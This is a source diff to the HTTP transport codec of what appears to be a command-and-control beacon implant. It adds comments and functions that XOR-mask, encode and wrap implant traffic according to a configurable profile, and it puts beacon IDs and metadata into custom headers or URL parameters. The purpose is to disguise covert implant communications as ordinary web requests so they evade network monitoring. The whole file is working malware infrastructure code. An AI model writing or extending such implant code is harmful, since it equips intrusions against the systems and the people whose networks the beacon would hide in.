@@ -1,8 +1,13 @@
 /* beacon/src/Transport/HttpCodec.c
  * OutputConfig-driven encode/decode pipeline and request header builder.
- * Used by Http.c (NaxHttpGet, NaxHttpPost) to transform data per profile. */
+ * Used by Http.c (NaxHttpGet, NaxHttpPost) to transform data per profile.
+ *
+ * High-level codec: NaxHttpEncodeBody + NaxHttpDecodeResponse absorb the
+ * profile-check / format-select / DynResp logic that was scattered across
+ * Http.c call sites. */
 
 #include "Nax.h"
+#include "Transport.h"
 
 /* ========= [ OutputConfig encode/decode ] ========= */
 
@@ -19,12 +24,14 @@ FUNC UINT32 NaxEncodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const P
     PBYTE mask_buf = work;
     PCHAR enc_buf  = (PCHAR)( work + mask_cap );
 
+    /* XOR mask */
     if ( cfg->Mask ) {
         input_len = NaxXorMask( Nax, input, input_len, mask_buf, mask_cap );
         if ( input_len == 0 ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, work ); return 0; }
         input = mask_buf;
     }
 
+    /* Encode */
     UINT32 enc_len = 0;
     switch ( cfg->Format ) {
     case NAX_FMT_BASE64:
@@ -45,6 +52,7 @@ FUNC UINT32 NaxEncodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const P
         break;
     }
 
+    /* Prepend + encoded + append */
     UINT32 total = cfg->PrependLen + enc_len + cfg->AppendLen;
     if ( total > dst_cap ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, work ); return 0; }
     UINT32 off = 0;
@@ -60,6 +68,7 @@ FUNC UINT32 NaxDecodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const P
     PBYTE  data     = (PBYTE)src;
     UINT32 data_len = src_len;
 
+    /* Strip prepend/append */
     if ( data_len >= cfg->PrependLen + cfg->AppendLen ) {
         data     += cfg->PrependLen;
         data_len -= cfg->PrependLen + cfg->AppendLen;
@@ -69,6 +78,7 @@ FUNC UINT32 NaxDecodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const P
     PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, buf_sz );
     if ( !dec_buf ) return 0;
 
+    /* Decode format */
     UINT32 dec_len = 0;
     switch ( cfg->Format ) {
     case NAX_FMT_BASE64:
@@ -85,6 +95,7 @@ FUNC UINT32 NaxDecodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const P
         break;
     }
 
+    /* XOR unmask */
     if ( cfg->Mask && dec_len > 4 ) {
         UINT32 r = NaxXorUnmask( dec_buf, dec_len, dst, dst_cap );
         Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
@@ -120,12 +131,14 @@ FUNC UINT32 NaxAppendCRLF( PWCHAR out, UINT32 wi, UINT32 cap ) {
 FUNC VOID NaxBuildRequestHeaders( PNAX_INSTANCE Nax, const PCHAR sid, const PCHAR hdr_base, UINT32 hdr_stride, BYTE hdr_count, const NAX_OUTPUT_CFG* meta_cfg, const PCHAR meta_encoded, UINT32 meta_encoded_len, BOOL is_post, PWCHAR out, UINT32 out_cap ) {
     UINT32 wi = 0;
 
+    /* Beacon ID header - name from profile (default: X-Beacon-Id) */
     wi = NaxAppendAsciiW( Nax->Config.BeaconIdHdr, out, wi, out_cap );
     if ( wi < out_cap - 1 ) out[ wi++ ] = L':';
     if ( wi < out_cap - 1 ) out[ wi++ ] = L' ';
     wi = NaxAppendAsciiW( sid, out, wi, out_cap );
     wi = NaxAppendCRLF( out, wi, out_cap );
 
+    /* Place metadata per OutputConfig placement */
     if ( meta_encoded && meta_encoded_len > 0 ) {
         switch ( meta_cfg->Placement ) {
         case NAX_PLACE_HEADER: {
@@ -160,6 +173,7 @@ FUNC VOID NaxBuildRequestHeaders( PNAX_INSTANCE Nax, const PCHAR sid, const PCHA
         wi = NaxAppendCRLF( out, wi, out_cap );
     }
 
+    /* Extra headers from profile */
     for ( BYTE h = 0; h < hdr_count; h++ ) {
         wi = NaxAppendAsciiW( hdr_base + h * hdr_stride, out, wi, out_cap );
         wi = NaxAppendCRLF( out, wi, out_cap );
@@ -223,13 +237,16 @@ FUNC BOOL NaxBuildUrl( PNAX_INSTANCE Nax, const PWCHAR url_w, PCHAR uri, PWCHAR 
 FUNC VOID NaxBuildPathWithParams( PWCHAR path_src, PWCHAR path_out, UINT32 path_cap, const NAX_OUTPUT_CFG* meta_cfg, const PCHAR meta_encoded, UINT32 meta_encoded_len, const PCHAR param_base, UINT32 param_stride, BYTE param_count ) {
     UINT32 wi = 0;
 
+    /* Copy base path */
     while ( path_src[ wi ] && wi < path_cap - 256 ) { path_out[ wi ] = path_src[ wi ]; wi++; }
 
     BOOL has_qmark = FALSE;
+    /* Check if path already contains '?' */
     for ( UINT32 c = 0; c < wi; c++ ) {
         if ( path_out[ c ] == L'?' ) { has_qmark = TRUE; break; }
     }
 
+    /* Append metadata as parameter if placement == PARAMETER */
     if ( meta_cfg && meta_encoded && meta_encoded_len > 0 && meta_cfg->Placement == NAX_PLACE_PARAMETER ) {
         if ( ! has_qmark ) { path_out[ wi++ ] = L'?'; has_qmark = TRUE; }
         else               { path_out[ wi++ ] = L'&'; }
@@ -238,6 +255,7 @@ FUNC VOID NaxBuildPathWithParams( PWCHAR path_src, PWCHAR path_out, UINT32 path_
         wi = NaxAppendAsciiW( meta_encoded, path_out, wi, path_cap );
     }
 
+    /* Append static parameters: each entry is "name=value" */
     for ( BYTE p = 0; p < param_count; p++ ) {
         if ( ! has_qmark ) { path_out[ wi++ ] = L'?'; has_qmark = TRUE; }
         else               { path_out[ wi++ ] = L'&'; }
@@ -246,3 +264,82 @@ FUNC VOID NaxBuildPathWithParams( PWCHAR path_src, PWCHAR path_out, UINT32 path_
 
     path_out[ wi ] = L'\0';
 }
+
+/* ========= [ high-level codec ] ========= */
+
+#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_HTTP
+
+static BOOL NaxOutputCfgNeedsDecode( const NAX_OUTPUT_CFG* cfg ) {
+    return cfg->Format != NAX_FMT_RAW || cfg->Mask || cfg->PrependLen > 0 || cfg->AppendLen > 0;
+}
+
+FUNC UINT32 NaxHttpEncodeBody( PNAX_INSTANCE Nax, const PBYTE body, UINT32 body_len, PBYTE enc_buf, UINT32 enc_cap ) {
+    if ( ! Nax->Config.ProfileLoaded || Nax->Config.PostClientOutput.Format == NAX_FMT_RAW )
+        return 0;
+    return NaxEncodeData( Nax, &Nax->Config.PostClientOutput, body, body_len, enc_buf, enc_cap );
+}
+
+FUNC VOID NaxHttpDecodeResponse( PNAX_INSTANCE Nax, BYTE txn_type, PBYTE read_buf, UINT32 read_len, PBYTE resp_buf, UINT32* resp_len ) {
+    if ( ! Nax->Config.ProfileLoaded || read_len == 0 ) {
+        if ( read_buf == resp_buf )
+            *resp_len = read_len;
+        else {
+            Nax->DynResp    = read_buf;
+            Nax->DynRespLen = read_len;
+            *resp_len       = 0;
+        }
+        return;
+    }
+
+    const NAX_OUTPUT_CFG* cfg = ( txn_type == NAX_TXN_GET ) ? &Nax->Config.GetServerOutput : &Nax->Config.PostServerOutput;
+
+    if ( ! NaxOutputCfgNeedsDecode( cfg ) ) {
+        if ( read_buf == resp_buf )
+            *resp_len = read_len;
+        else {
+            Nax->DynResp    = read_buf;
+            Nax->DynRespLen = read_len;
+            *resp_len       = 0;
+        }
+        return;
+    }
+
+    UINT32 dec_cap = read_len + 256;
+    PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, dec_cap );
+    if ( ! dec_buf ) {
+        if ( read_buf != resp_buf ) {
+            Nax->DynResp    = read_buf;
+            Nax->DynRespLen = read_len;
+            *resp_len       = 0;
+        } else {
+            *resp_len = read_len;
+        }
+        return;
+    }
+
+    UINT32 dec_len = NaxDecodeData( Nax, cfg, read_buf, read_len, dec_buf, dec_cap );
+
+    if ( dec_len > 0 && dec_len <= dec_cap ) {
+        if ( read_buf == resp_buf ) {
+            MmCopy( resp_buf, dec_buf, dec_len );
+            *resp_len = dec_len;
+            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
+        } else {
+            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, read_buf );
+            Nax->DynResp    = dec_buf;
+            Nax->DynRespLen = dec_len;
+            *resp_len       = 0;
+        }
+    } else {
+        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
+        if ( read_buf != resp_buf ) {
+            Nax->DynResp    = read_buf;
+            Nax->DynRespLen = read_len;
+            *resp_len       = 0;
+        } else {
+            *resp_len = read_len;
+        }
+    }
+}
+
+#endif /* NAX_TRANSPORT_HTTP */
